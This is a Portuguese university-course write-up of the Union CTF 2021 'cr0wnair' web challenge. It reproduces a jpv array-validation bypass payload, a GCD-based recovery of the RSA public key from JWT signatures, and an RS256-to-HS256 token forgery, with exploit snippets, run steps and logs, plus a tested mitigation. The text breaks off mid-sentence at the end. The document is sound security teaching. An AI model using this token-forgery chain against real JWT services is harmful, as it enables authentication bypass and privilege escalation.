# Union CTF 2021 — cr0wnair (Web)

Write-up e reprodução do desafio **cr0wnair**, categoria Web do
Union CTF 2021, desenvolvido como avaliação (E2) da disciplina
**Segurança Cibernética (CCO-04.2.01)** — PPGCC, UFSCar.

## Membros do grupo

- Bruno Camargo Ribeiro
- Bruno Hiroki Nagao Anhaia
- Cilene Renata Real
- Emerson Hermann Lira dos Santos
- Gabriel Alves Moreira
- Jonathan Choy Rivera
- Stephanie Maria Braga
- Thayná Marostica Machado da Silva

---

## 1. Identificação do desafio e objetivo

**cr0wnair** é uma aplicação Node.js de check-in de voo. Ao completar um check-in, o servidor emite um **JWT** (JSON Web Token) assinado com **RS256** (RSA + SHA-256), contendo o status do passageiro(`bronze` ou `gold`).

**Objetivo:** obter um JWT com `{"status": "gold"}` aceito pelo endpoint `/upgrades/flag`, revelando a flag — sem nunca ter acesso direto à chave privada nem à chave pública do servidor.

Esse foi o desafio que estabelece uma integração entre os mecanismos de autenticação Web e os recursos de criptografia aplicada, evidenciando que a validação do algoritmo criptográfico, da chave empregada e da representação do token constitui uma única fronteira de confiança no processo de autenticação.

**O processo acontece nas etapas:** 

1. A aplicação Web disponibilizada utiliza versões desatualizadas das bibliotecas `jpv` e `jwt-simple`, apresentando possíveis vulnerabilidades decorrentes dessas dependências. 

2. A aplicação implementa uma verificação para impedir a utilização de determinados algoritmos na assinatura dos tokens JWT. Entretanto, essa validação pode ser contornada por meio da manipulação do construtor do objeto, especificamente quando sua propriedade `name` coincide com o valor de `name` de `[].constructor`. 

3. Após o contorno da validação, é possível recuperar a chave pública utilizada no processo de autenticação a partir de quatro tokens JWT. 

4. Por fim, a chave pública obtida é utilizada indevidamente como segredo para gerar uma assinatura utilizando o algoritmo `HS256`, de natureza simétrica, em substituição ao `RS256`, que emprega um mecanismo de assinatura assimétrica. 

**Exploração cada etapa:** 

**1. Obtenção do token JWT:** 
A aplicação utiliza a biblioteca jpv para validar os dados enviados no `endpoint /checkin`. Entretanto, uma falha na validação de arrays permite contornar essa proteção. Ao fornecer um objeto manipulado no campo extras, é possível fazer a aplicação acreditar que recebeu um array válido e, ao mesmo tempo, inserir o valor `sssr: "FQTU"`. Essa condição faz com que a aplicação gere e exponha um JWT.  

**2.Obtenção da chave pública RSA:**
Os tokens obtidos são assinados originalmente com `RS256`, utilizando uma chave privada RSA. A partir de quatro tokens válidos, o código explora propriedades matemáticas da assinatura RSA para calcular o módulo `n` da chave pública. O `gcd` (máximo divisor comum) entre os valores derivados das duas assinaturas permite recuperar esse módulo e, consequentemente, reconstruir a chave pública.  

**3.Confusão entre RS256 e HS256:**
O `endpoint/upgrades` utiliza `jwt.decode(token, config.pubkey)` sem restringir explicitamente o algoritmo esperado. Isso permite uma situação de _algorithm confusion_: em vez de verificar um token `RS256` com a chave pública RSA, o servidor pode interpretar um token declarado como `HS256` e utilizar a própria chave pública como segredo HMAC.  

**4.Forjamento do token e obtenção da flag:** 
Com a chave pública recuperada, é criado um novo JWT com `alg:HS256` e payload contendo `status:"gold"`. A assinatura é produzida utilizando HMAC-SHA256 e a chave pública como segredo. Como o servidor aceita essa combinação, o token falsificado é considerado válido e permite acessar `/upgrades/flag`. 

---

## 2. A vulnerabilidade

O ataque combina uma falha de validação de entrada na biblioteca `jpv` com uma falha de validação do algoritmo no `jwt-simple`, permitindo obter tokens, reconstruir a chave pública `RSA` e, posteriormente, utilizá-la indevidamente como segredo `HMAC` para forjar um JWT com privilégios de `cliente gold`. 

O ponto de segurança mais importante é que não existe apenas uma falha isolada: a exploração depende do encadeamento de vulnerabilidades. A vulnerabilidade do `jpv` permite chegar aos tokens, enquanto a configuração inadequada do `jwt-simple` permite transformar a chave pública em um mecanismo para forjar uma nova assinatura.

Antes de detalhar cada etapa (2.1 a 2.4), vale situar **quando** os dois tipos de token aparecem na linha do tempo do ataque — essa distinção é a base para entender tudo que segue:

```
1. Atacante envia o bypass do jpv pro servidor (4 vezes, ffp diferente)
2. Servidor responde com um token RS256 ──────────► TOKEN LEGÍTIMO (x4)
                                                     (status sempre "bronze")
3. Atacante usa os 4 tokens legítimos para calcular o MDC entre eles → descobre a chave pública (N)

4. Atacante MONTA um token novo, escrevendo
   "status: gold" e assinando com HS256, usando
   a chave que acabou de descobrir ──────────────► TOKEN FORJADO (x1)

5. Atacante envia esse token forjado pro servidor
   (endpoint /upgrades/flag)
6. Servidor verifica — e aceita, achando que é RS256
   de verdade, mas na real é HS256 disfarçado
7. Servidor devolve a flag
```

| | Token **legítimo** (RS256) | Token **forjado** (HS256) |
|---|---|---|
| Quantos | 4 | 1 |
| Quem cria | O servidor, de verdade | O atacante |
| Quando aparece | No início, como resposta ao bypass (passo 2) | No final, depois de já ter a chave (passo 4) |
| Para que serve | É só matéria-prima — usado para calcular a chave via MDC, não dá acesso sozinho | É o produto final do ataque — é ele que engana o servidor e libera a flag |

Os 4 tokens legítimos não dão acesso a nada sozinhos — eles só fornecem a "munição matemática" (a chave). Só depois de ter essa chave é que o único token forjado é fabricado, e é ele quem realmente quebra a segurança do servidor.

### 2.1 Vulnerabilidade JPV 

A biblioteca jpv é utilizada para realizar a validação das entradas fornecidas pelo usuário com base em padrões previamente estabelecidos. 

Padrões definidos: 

```javascript
const pattern = {
  firstName: /^\w{1,30}$/,
  lastName: /^\w{1,30}$/,
  passport: /^[0-9]{9}$/,
  ffp: /^(|CA[0-9]{8})$/,
  extras: [
      {sssr: /^(BULK|UMNR|VGML)$/},
    ],
  };
```
Entretanto, na linha 42 do arquivo `checkin.js`, há uma verificação que avalia se o campo `data["extras"][e]["sssr"]` possui o valor `"FQTU"`. Quando essa condição é satisfeita, a aplicação gera e expõe um token JWT: 

```javascript
for(e in data["extras"]) { 
  if (data["extras"][e]["sssr"] && data["extras"][e]["sssr"] === "FQTU") { 
    var token = createToken(data["passport"], data["ffp"]); 
    var response = {msg: "You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.", "token": token}; 
  }
}
```
Para atender a essa condição e contornar a validação realizada pela `biblioteca jpv`, explora-se a vulnerabilidade descrita no issue #6 do projeto. A validação do campo extras utiliza um padrão que espera um array de objetos contendo o atributo sssr, cujo valor deve corresponder a uma das opções permitidas: `BULK, UMNR ou VGML.` 

Entretanto, na versão `jpv@2.0.1`, a verificação responsável por determinar se o valor fornecido é efetivamente um array apresenta uma implementação inadequada. A biblioteca utiliza uma verificação baseada na propriedade `constructor.name`, como em `obj.constructor.name === 'Array'`. Como essa propriedade pode ser manipulada em `JavaScript`, é possível fornecer um objeto cujo `constructor.name` seja definido como `"Array"`, fazendo com que a biblioteca o interprete incorretamente como um array e permitindo enganar a validação. 

Foi utilizado o payload:

```json
{
  "firstName": "Algum",
  "lastName": "Nome",
  "passport": "123456789",
  "ffp": "CA12345678",
  "extras": {
    "x": {
      "sssr": "FQTU" 
    },
    "constructor": {
      "name": "Array"
    }
  }
}
```

Dessa forma, foi possível obter diferentes `tokens JWT` mediante a alteração dos valores dos campos `passport` ou `ffp`. 

 
### 2.2 Bypass do filtro de validação (`jpv`)

O JWT possui, em seu cabeçalho `(header)`, o campo `alg`, responsável por indicar o algoritmo utilizado para a assinatura do token, como `RS256` ou `HS256`. O algoritmo `RS256` utiliza criptografia assimétrica baseada em `RSA`, empregando uma chave privada para realizar a assinatura e uma chave pública para sua verificação. Já o `HS256` utiliza o mecanismo `HMAC-SHA256`, baseado em uma chave secreta compartilhada entre as partes. No contexto deste desafio, o algoritmo empregado originalmente é o `RS256`, conforme pode ser observado na implementação da função `createToken` presente no arquivo checkin.js: 

```javascript
function createToken(passport, frequentFlyerNumber) { 
  var status = isSpecialCustomer(passport, frequentFlyerNumber) ? "gold" : "bronze"; 
  var body = {"status": status, "ffp": frequentFlyerNumber}; 
  return jwt.encode(body, config.privkey, 'RS256'); 
}
```

Entretanto, no arquivo `upgrade.js`, o token é decodificado por meio da seguinte implementação:

```javascript
function getLoyaltyStatus(req, res, next) { 
  if (req.headers.authorization) { 
    let token = req.headers.authorization.split(" ")[1]; 
    try { 
      var decoded = jwt.decode(token, config.pubkey); 
    } catch { 
      return res.json({ msg: 'Token is not valid.' }); 
    } 
    res.locals.token = decoded; 
  } 
  next() 
}
```

Em contrapartida, no arquivo `upgrade.js`, a função `jwt.decode(token, key)` é utilizada sem que o algoritmo de assinatura seja explicitamente restringido. Nesse processo, a chave fornecida corresponde a `config.pubkey`, ou seja, à chave pública utilizada na verificação dos tokens. 

Na versão `jwt-simple@0.5.2`, quando o token especifica `HS256` no campo `alg`, a biblioteca interpreta a chave fornecida como um segredo simétrico e realiza a verificação por meio do `HMAC-SHA256 . Dessa forma, não há uma validação adequada da compatibilidade entre o algoritmo declarado no token e o tipo de chave utilizado na verificação. 

Consequentemente, caso a chave pública seja conhecida ou possa ser reconstruída, torna-se possível criar um JWT cujo algoritmo declarado seja `HS256`  e utilizar a própria chave pública, em formato PEM, como segredo para gerar a assinatura `HMAC-SHA256`. Durante a validação, o servidor utilizará a mesma config.pubkey e seguirá o algoritmo indicado no cabeçalho do token, permitindo que a assinatura seja considerada válida. Esse comportamento caracteriza uma confusão de algoritmos `(algorithm confusion)`, na qual uma chave destinada à verificação de uma assinatura assimétrica `(RS256)` é reutilizada como segredo em um mecanismo de assinatura simétrica `(HS256)`. 

Na etapa seguinte, os quatro tokens obtidos anteriormente são utilizados para auxiliar na reconstrução da chave pública RSA. No esquema `RS256`, após o processamento criptográfico do cabeçalho e do payload do JWT e a aplicação do padding conforme o padrão `PKCS#1 v1.5`, obtém-se o valor que será representado por `pt`. A assinatura `RSA` é então relacionada a esse valor por meio da operação modular característica do algoritmo: 

`sig == pt^d (mod n)  // d = expoente privado` 

A verificação é feita com `sig^e == pt (mod n)`. 

Para determinar o valor do módulo `n` e, consequentemente, reconstruir a chave pública original, utiliza-se a função auxiliar `get_magic()`, avaliando diferentes valores possíveis para o expoente público `e`. Nesse caso, foram considerados os valores mais comuns, até identificar o valor `65537`, amplamente utilizado em chaves `RSA`. 

```
def get_magic(jwt_token: str, e: int)` -> gmpy2.mpz:  
    header, payload, signature = jwt_token.split(".") 
    raw_signature = urlsafe_b64decode(f"{signature}==")  
    raw_signature_int = gmpy2.mpz(bytes_to_long(raw_signature)) 
    padded_msg = pkcs1_v1_5_encode(f"{header}.{payload}".encode(), len(raw_signature)) 
	   padded_int = gmpy2.mpz(bytes_to_long(padded_msg)) 
   	return gmpy2.mpz(pow(raw_signature_int, e) - padded_int)
```

Dessa forma, obtém-se um valor que corresponde a um múltiplo desconhecido do módulo, representado por `k·n`, em que `k` é um número inteiro. A partir de dois tokens distintos, é possível calcular o máximo divisor comum (GCD) dos valores obtidos. Esse cálculo permite determinar o módulo `n` e, consequentemente, reconstruir a chave pública RSA: 

```
pubkey = RSA.construct((int(N), int(e)))`
pem_rsa = pubkey.export_key() 
print("\nChave pública PEM:") 
print(pem_rsa) 
```

Com a chave pública reconstruída, torna-se possível elaborar o token final. Para viabilizar sua utilização sem o conhecimento da chave privada, altera-se, no cabeçalho do JWT, o algoritmo de assinatura de `RS256` para `HS256`. 

`{"alg": "HS256", "typ": "JWT"}`


### 2.3 Confusão de algoritmo RS256 → HS256

Código-fonte real do endpoint de verificação (`routes/upgrades.js`):

```javascript
function getLoyaltyStatus(req, res, next) {
  if (req.headers.authorization) {
    let token = req.headers.authorization.split(' ')[1];
    var decoded = jwt.decode(token, config.pubkey); // sem especificar o algoritmo!
    res.locals.token = decoded;
  }
  next();
}
```

A biblioteca `jwt-simple` usa o algoritmo **declarado no header do próprio token** (`header.alg`) para decidir como verificar a assinatura — em vez de um algoritmo fixo esperado pelo servidor.

- **RS256** (assimétrico): assina com a chave **privada**, verifica com a **pública**.
- **HS256** (simétrico): assina **e** verifica com a **mesma** chave secreta.

Se o atacante muda o header para `"alg":"HS256"` e assina o token usando a **chave pública** como se fosse o segredo HMAC, o servidor
— ao decodificar — usa essa mesma chave pública, mas agora como segredo HMAC, e a verificação **bate**. É a vulnerabilidade catalogada como **CVE-2017-11424**.

**A condição que falta:** o atacante precisa conhecer a chave pública — e ela nunca é exposta diretamente pela aplicação. Daí a necessidade da Seção 2.3.

### 2.4 Recuperando a chave pública via MDC (GCD)

Uma assinatura RSA satisfaz: `assinatura^e ≡ mensagem_com_padding (mod N)`.

Isso significa que `assinatura^e - mensagem_com_padding` é **um múltiplo exato de N**. Calculando essa conta para **várias assinaturas diferentes** (mesma chave), todos os resultados são múltiplos de `N` — e o **MDC (GCD)** entre eles tende a isolar justamente `N`.

**Detalhe descoberto durante a implementação:** usando **apenas 2**
assinaturas, o GCD pode trazer um **fator espúrio extra** compartilhado por coincidência entre as duas (na nossa primeira tentativa, um fator `93 = 3×31`). A solução: usar **4 tokens** e calcular o **GCD cumulativo** — fatores espúrios tendem a não se repetir simultaneamente em todos os pares.

### 2.5 Fechando com uma política de algoritmos permitidos (mitigação)

A causa raiz de toda a cadeia (Seção 2.2) é o servidor **confiar no próprio token** para decidir como verificá-lo. A correção não exige trocar de biblioteca — o `jwt-simple` já aceita um algoritmo forçado
como argumento:

```javascript
// routes/upgrades.js (ORIGINAL, vulnerável):
var decoded = jwt.decode(token, config.pubkey);

// routes/upgrades_seguro.js (CORRIGIDO):
var decoded = jwt.decode(token, config.pubkey, false, 'RS256');
```

No código-fonte do `jwt-simple` (`lib/jwt.js`):

```javascript
var signingMethod = algorithmMap[algorithm || header.alg];
```

Passar `'RS256'` como 4º argumento faz esse valor **vencer** o que está escrito no header do token — ou seja, o servidor sempre verifica como RS256, **não importa o que o atacante declare** no `alg`. Um
token forjado com `alg: HS256` é avaliado como se fosse RS256, a assinatura HMAC forjada falha na verificação RSA, e o token é rejeitado — **antes** de qualquer possibilidade de confusão de algoritmo.

Implementamos essa correção como uma rota **paralela**
(`/upgrades-seguro/flag`), ao lado da vulnerável (`/upgrades/flag`), para poder comparar o comportamento das duas contra o **mesmo** token forjado (evidência na Seção 9.3).

---

## 3. Referencial Teórico

**3.1 RS256:**

RS256 é um algoritmo utilizado para assinar tokens JWT, garantindo que o conteúdo do token não seja alterado sem que isso seja detectado. 
O nome pode ser entendido como: 
`RS → RSA`, algoritmo de criptografia assimétrica usado na assinatura.  
`256 → SHA-256`, função hash utilizada no processo.  

Assim, `RS256 = RSA + SHA-256`. 

Como funciona? 

O RS256 utiliza um par de chaves: 
`Chave privada`: utilizada para assinar o JWT.  
`Chave pública`: utilizada para verificar a assinatura. 

**3.2 HS256:** 

É um algoritmo utilizado para assinar tokens JWT, garantindo a integridade e autenticidade do conteúdo do token. 

O que significa HS256? 

O nome pode ser entendido assim: 
`HS → HMAC`, mecanismo utilizado para gerar a assinatura.  
`256 → SHA-256`, função hash utilizada pelo HMAC. 

Diferentemente do `RS256`, o `HS256` utiliza uma única chave secreta tanto para gerar quanto para verificar a assinatura. 


**abaixo parte do Bruno que eu não apaguei**

- **Estrutura de um JWT:** `header.payload.assinatura`, cada parte
  em Base64url.
- **RSA (nível conceitual):** chave pública `(N, e)`, chave privada
  `d`; assinar é `mensagem^d mod N`, verificar é `assinatura^e mod N`.
- **PKCS#1 v1.5:** formatação aplicada à mensagem antes de assinar
  com RSA — inclui um identificador fixo do algoritmo de hash
  (SHA-256) e um preenchimento de bytes `0xFF`.
- **MDC/GCD aplicado a criptoanálise:** mesmo "espírito" do CRT
  usado no desafio Share (E1) — usar múltiplas equações relacionadas
  para extrair um segredo, mas aqui via máximo divisor comum em vez
  de reconstrução por congruências.

---

## 4. Fluxograma de encadeamento das vulnerabilidades

Para facilitar a visualização de como as vulnerabilidades se conectam desde o primeiro acesso até a captura da flag, o diagrama abaixo visa mostrar as etapas sequenciais da exploração:

```text

[ Aplicação Web em Node.js ]
     │
     ▼
[ Acessar endpoint /checkin ]
     │
     ▼
[ Contornar validação JPV ]
     │
     ▼
[ Obter múltiplos JWTs válidos (4 tokens) ]
     │
     ▼
[ Recuperar módulo N via GCD cumulativo ]
     │
     ▼
[ Reconstruir chave pública (PEM) ]
     │
     ▼
[ Alterar alg para HS256 ]
     │
     ▼
[ Forjar JWT com status gold ]
     │
     ▼
[ Acessar área /upgrades/flag ]
     │
     ▼
[ Obter flag ]
```

---

## 5. Ambiente, dependências e versões

### Aplicação-alvo (Node.js)

A aplicação foi reconstruída pelo grupo com base no código-fonte documentado nos write-ups públicos do desafio. A chave RSA e a flag foram **geradas localmente**.

As bibliotecas usadas são intencionalmente desatualizadas, pois são elas que contêm as falhas exploradas:

| Pacote | Versão | Papel no ataque |
|--------|--------|-----------------|
| `jpv` | 2.0.1 | Validação de entrada com falha permite contornar a verificação de arrays |
| `jwt-simple` | 0.5.1 | Decodificação de JWT sem restringir o algoritmo permite a troca de RS256 por HS256 |
| `express` || Servidor HTTP (sem vulnerabilidade envolvida) |

### Como confirmamos que as versões são vulneráveis

O grupo executou `npm audit` no projeto e obteve 2 vulnerabilidades relacionadas às bibliotecas `jpv` e `jwt-simple`:

- **`jpv` ≤ 2.2.1** — severidade crítica. Corrigido apenas na versão 2.2.2. O bypass foi testado manualmente em 6 versões: funciona na 2.0.1, 2.0.0 e 1.5.1; não funciona na 2.1.0, 2.1.2 e 2.2.2.
- **`jwt-simple` < 0.5.3** — severidade alta. Corrigido na versão 0.5.3.

Os detalhes técnicos de cada vulnerabilidade estão na tabela abaixo:

| Pacote | CVE | Resumo | Correção |
|--------|-----|--------|----------|
| `jpv` | CVE-2019-19507 | Aceita objetos como se fossem arrays quando o campo `constructor.name` é manipulado (issue [#6](https://github.com/manvel-khnkoyan/jpv/issues/6)) | v2.1.1 (parcial) |
| `jpv` | CVE-2020-17479 | A correção da v2.1.1 ainda permitia burlar a validação (issue [#10](https://github.com/manvel-khnkoyan/jpv/issues/10)). Só na v2.2.2, com `Array.isArray()`, a vulnerabilidade foi solucionada | v2.2.2 (definitiva) |
| `jwt-simple` | CVE-2016-10555 | `jwt.decode()` não exige que o servidor defina o algoritmo e aceita o que vier no próprio token | v0.5.3 |

### Script de ataque (Python)

- **Python 3.8+**, com uma única dependência externa: **`gmpy2`**.
  Sem ela, a operação central do ataque (elevar a assinatura a uma potência de 65537) gera números com milhões de dígitos e torna o cálculo inviável. Em nossos testes, ultrapassou 5 minutos sem terminar. O write-up original (Kalmarunionen) recomenda a mesma solução.
- Todo o restante do código (formatação de chave, codificação, assinatura) foi reescrito, sem usar bibliotecas prontas de criptografia.

---

## 6. Estrutura do repositório

```
cr0wnair-writeup/
├── app/                        # aplicacao-alvo (vulneravel, reimplementada)
│   ├── package.json            # fixa jpv@2.0.1 e jwt-simple@0.5.1
│   ├── config.js               # le os artefatos gerados (nunca commita segredos)
│   ├── app.js                  # servidor Express (monta as 3 rotas abaixo)
│   └── routes/
│       ├── checkin.js          # emissao do JWT -- ponto de entrada do bypass jpv
│       ├── upgrades.js         # verificacao VULNERAVEL -- confusao RS256/HS256
│       └── upgrades_seguro.js  # verificacao CORRIGIDA -- politica de algoritmos (Secao 2.4)
├── scripts/
│   └── gerar_ambiente.js       # gera chave RSA + flag PROPRIAS do grupo, na hora
├── exploit/                    # o ataque, em Python puro + gmpy2
│   ├── rsa_jwt_lib.py          # PKCS#1, DER/PEM, GCD, forja de JWT (reutilizavel)
│   ├── demo_cr0wnair_attack.py # simulacao completa, sem precisar do servidor
│   ├── ataque_real.py          # ataque via HTTP contra o servidor Node.js real (testa os 2 endpoints)
│   ├── politica_algoritmos.py  # demonstra a mitigacao em Python puro (sem precisar do servidor)
│   └── requirements.txt        # gmpy2
├── docs/
│   └── plano-estudo-cr0wnair.md
└── .gitignore                  # ignora node_modules/, app/keys/, venv/
```

---

## 7. Origem dos artefatos e adaptações do grupo

- **Código-fonte da aplicação:** reconstruído a partir do que está
  publicamente documentado nos write-ups (ret2school, Kalmarunionen,
  STT/sectt) do Union CTF 2021 - o `source.zip` original não foi
  reaproveitado diretamente; o código foi digitado/adaptado a partir
  do que os write-ups reproduzem.
- **Chave RSA e flag:** geradas do zero pelo grupo
  (`scripts/gerar_ambiente.js`), nunca reaproveitando os artefatos
  do desafio original — conforme exigido pelo professor.
- **Técnica de ataque:** a lógica central (bypass `jpv` + GCD +
  confusão RS256/HS256) é **conhecida e catalogada** como
  **CVE-2017-11424**, com uma ferramenta pública completa
  (`rsa_sign2n`, da Silent Signal) já implementando exatamente esse
  ataque. **Não usamos essa ferramenta como dependência**, toda a
  matemática foi reimplementada do zero em Python puro (ver Seção 8).

---

## 8. Como rodar (instruções de ponta a ponta)

Requer dois terminais abertos simultaneamente: um para o servidor,
outro para o ataque.

### Linux / macOS

**Terminal 1 — subir a aplicação-alvo:**

```bash
cd app
npm install
node ../scripts/gerar_ambiente.js
node app.js
```

Deve aparecer: `cr0wnair (reimplementacao) rodando na porta 3000`.

**Terminal 2 — rodar o ataque:**

```bash
cd exploit
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# opcional: simulação local, sem precisar do servidor
python3 demo_cr0wnair_attack.py

# ataque real, contra o servidor do Terminal 1
python3 ataque_real.py
```

### Windows (PowerShell)

**Terminal 1 — subir a aplicação-alvo:**

```powershell
cd app
npm install
node ../scripts/gerar_ambiente.js
node app.js
```

**Terminal 2 — rodar o ataque:**

```powershell
cd exploit
python -m venv venv
venv\Scripts\activate
pip install -r requirements.txt

python demo_cr0wnair_attack.py
python ataque_real.py
```

> Se `gmpy2` falhar ao instalar no Windows, use:
> `pip install gmpy2 --only-binary :all:`

---

## 9. Explicação das etapas do código

### `rsa_jwt_lib.py` (módulo compartilhado)

- **`pkcs1_v1_5_encode`** — monta o bloco de padding exigido antes
  de assinar/verificar com RSA: `0x00 0x01 [FF...FF] 0x00
  [identificador SHA-256] [hash]`.
- **Codificador DER (`der_integer`, `der_sequence`, `der_bitstring`,
  `der_oid_rsa_encryption`)** — monta a estrutura ASN.1 de uma
  chave pública RSA (`SubjectPublicKeyInfo`) byte a byte, sem
  depender de OpenSSL.
- **`recupera_modulo_n`** — para cada token, calcula `magic =
  assinatura^e - mensagem_com_padding` (usando `gmpy2` pela escala
  do número) e tira o **GCD cumulativo** de todos — isola `N`.
- **`limpa_fatores_pequenos`** — salvaguarda: remove fatores
  pequenos residuais comparando o tamanho em bits contra o esperado.
- **`forja_token_hs256`** — monta um JWT novo, assinando
  `header.payload` com **HMAC-SHA256 usando o PEM como segredo**.

### `demo_cr0wnair_attack.py` (simulação local)

Reimplementa a classe do servidor (`ServidorCr0wnair`) inteiramente
em Python, incluindo o mesmo bug de `decode()` — permite testar e
demonstrar o ataque sem precisar do Node.js rodando.

### `ataque_real.py` (ataque via HTTP)

- **`checkin_com_bypass`** — envia o payload de bypass do `jpv`
  (Seção 2.1) via HTTP real, repetido com `ffp` diferentes.
- Descobre o tamanho de `N` a partir do **tamanho da assinatura**
  recebida (não precisa ser informado manualmente).
- Reaproveita `rsa_jwt_lib` para recuperar `N`, montar o PEM, forjar
  o token, e testa o **mesmo** token forjado contra dois endpoints:
  `/upgrades/flag` (vulnerável) e `/upgrades-seguro/flag`
  (corrigido) — evidência lado a lado na Seção 9.3.

### `routes/upgrades_seguro.js` (mitigação, Seção 2.4)

Idêntica a `upgrades.js`, com uma única linha alterada: o algoritmo
é passado explicitamente para `jwt.decode()`, em vez de deixar o
token declarar. Montada em paralelo no `app.js`
(`/upgrades-seguro`), sem alterar a rota vulnerável original — as
duas convivem no mesmo servidor para permitir a comparação direta.

### `politica_algoritmos.py` (mitigação, versão simulada)

Mesmo princípio de `upgrades_seguro.js`, mas em Python puro: define
`decode_seguro()` com uma allowlist de algoritmos, e testa o mesmo
par de tokens (legítimo e forjado) contra a versão vulnerável e a
corrigida, sem precisar do servidor Node.js rodando.

---

## 10. Evidência de reprodução

### 10.1 — Simulação local (`demo_cr0wnair_attack.py`)

```
Chave gerada: N tem 511 bits, e=65537
Gerados 4 tokens RS256 (ffp diferentes).
Recuperando N via MDC (GCD cumulativo) das assinaturas...
N real:       4827094155224569492139564905616862436645903368972623249698554312646711061571671574817049684367201220125669778432084578612122671982171695100017754263214731
N recuperado: 4827094155224569492139564905616862436645903368972623249698554312646711061571671574817049684367201220125669778432084578612122671982171695100017754263214731
[OK] N recuperado corretamente, sem acesso direto a chave publica.

Token forjado (HS256): eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
Resposta do servidor ao token forjado:
  union{demo_local_sem_node_js}
[SUCESSO] Ataque completo: RSA quebrado via GCD + confusao RS256/HS256.
tempo total: 6.95 s
```

**Reproduzido de forma independente pelo grupo (Windows, venv
próprio):** mesma sequência, `N` recuperado batendo exatamente,
`tempo total: 6.3 s`.

### 10.2 — Ataque real, contra o servidor Node.js (`ataque_real.py`)

Executado com o servidor de verdade rodando (`app.js`), gerando os
próprios artefatos (`gerar_ambiente.js`):

```
Atacando servidor real em: http://localhost:3000

  Token obtido (ffp=CA12345678): eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...
  Token obtido (ffp=CA12345677): eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...
  Token obtido (ffp=CA12345676): eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...
  Token obtido (ffp=CA12345675): eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...

Tamanho da assinatura (= tamanho de N): 128 bytes (1024 bits)

Recuperando N via MDC (GCD cumulativo)...
N recuperado: 141583624389789801102035775194692024395326479849020701040171439668642036548531628790706901424890449372077637437069829009314522676469776475764874603793113650881459651830575993959044151940167961997698017980033982161439736864684950460116254331020107859307891349299327567031231081722654476966861869506897483219559
Bits: 1024

Chave publica reconstruida:
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDJnyyP13is+EPbrzTsNdr07mkD
8YNO2xFWd/e/kfFeODbEEUcdMk+eFhBRk8pVSobIvi57h6QxZ17jmb/1sEK0J0EG
qCx6PM7lXYGIbBBqRE9LSt6FkgWHVsMmRiEZqhak+2sqXUMzJ8Phr0Gp4O82oPXd
4gcYwnU+Rh39MVFCZwIDAQAB
-----END PUBLIC KEY-----

Token forjado (HS256): eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...

Resposta do servidor real ao token forjado:
  grupo{flag_propria_de_demonstracao_cr0wnair}
```

**Confirmação independente:** o `N` recuperado foi conferido byte a
byte contra o `pubkey.pem` gerado localmente — bateu exatamente.

**Executado de forma independente pelo grupo, em Windows** (venv
próprio, aplicação Node.js rodando localmente): mesmo resultado —
os 4 tokens obtidos via bypass real, `N` de 1024 bits recuperado, e
a flag própria (`grupo{flag_propria_de_demonstracao_cr0wnair}`)
retornada corretamente pelo servidor real.

Essa dupla evidência — simulação local **e** ataque real contra a
aplicação Node.js verdadeira, reproduzida em dois sistemas
operacionais diferentes — confirma que a reprodução funciona de
ponta a ponta, não apenas em teoria.

### 10.3 — Mitigação: mesmo token forjado, contra o endpoint corrigido

Executando `ataque_real.py` (versão estendida) contra o servidor
real, com a rota `/upgrades-seguro/flag` (Seção 2.4) montada em
paralelo à vulnerável:

```
Resposta do endpoint VULNERAVEL (/upgrades/flag) ao token forjado:
  grupo{flag_propria_de_demonstracao_cr0wnair}

Resposta do endpoint CORRIGIDO (/upgrades-seguro/flag) ao MESMO token forjado:
  Token is not valid.
```

**Mesma chave, mesmo token forjado, mesma execução** — a única
diferença é a linha `jwt.decode(token, config.pubkey, false,
'RS256')` na rota corrigida. Isso comprova que a causa raiz da
vulnerabilidade é especificamente a ausência de uma política de
algoritmos permitidos, e que a correção proposta (Seção 2.4) resolve
exatamente esse problema, sem quebrar o fluxo legítimo (tokens
RS256 reais continuam sendo aceitos normalmente).

A mesma comparação foi confirmada também em Python puro, sem
depender do servidor (`exploit/politica_algoritmos.py`), com
resultado idêntico.

---

## 11. Contribuições próprias do grupo

- **Reimplementação completa em Python puro**, sem depender da
  ferramenta pública já existente para essa CVE (`rsa_sign2n`) —
  usada apenas como referência de conferência, nunca como
  dependência do código entregue.
- **Codificador DER/ASN.1 escrito do zero**, sem OpenSSL nem
  bibliotecas de criptografia — monta a chave pública em PEM
  manualmente.
- **Identificação e correção do problema do fator espúrio no GCD**
  (2 tokens trazendo um fator `93` extra) — solução com 4 tokens e
  GCD cumulativo, mais uma salvaguarda de limpeza de fatores
  pequenos residuais. Esse é um detalhe prático não coberto em
  profundidade nos write-ups públicos consultados.
- **Identificação da versão exata vulnerável do `jpv`** (`2.0.1`),
  testando sistematicamente contra 6 versões diferentes do pacote
  para confirmar em qual o bypass funciona e em qual foi corrigido.
- **Automação da geração de artefatos** (`gerar_ambiente.js`) —
  chave RSA e flag geradas localmente a cada execução, nunca
  commitadas, reforçando de forma automática a exigência de usar
  artefatos próprios.
- **Ataque real via HTTP** (`ataque_real.py`), além da simulação —
  descobre o tamanho de `N` dinamicamente a partir do tamanho da
  assinatura recebida, sem valores fixos hardcoded.
- **Reprodução testada em dois sistemas operacionais** (Linux e
  Windows), por dois membros diferentes do grupo, de forma
  independente.
- **Mitigação implementada e testada lado a lado com a
  vulnerabilidade** (Seção 2.4 e 9.3) — não apenas descrita em
  texto: uma rota corrigida real (`upgrades_seguro.js`) rodando no
  mesmo servidor, comprovando que o mesmo ataque que funciona contra
  a rota original falha contra a corrigida.

---

## 12. Nota sobre divergência nos materiais da disciplina

A coluna "Escopo" do desafio, na planilha da disciplina, menciona
"conservar `fast-json-stringify` e `jsonwebtoken` nas versões
vulneráveis". Nos três materiais públicos fornecidos (write-up do
sectt, `source.zip`, e o repositório de write-ups de
matheuspd) e em write-ups adicionais consultados de forma
independente, **não encontramos nenhuma referência a essas duas
bibliotecas** — todas as fontes, sem exceção, confirmam `jpv` e
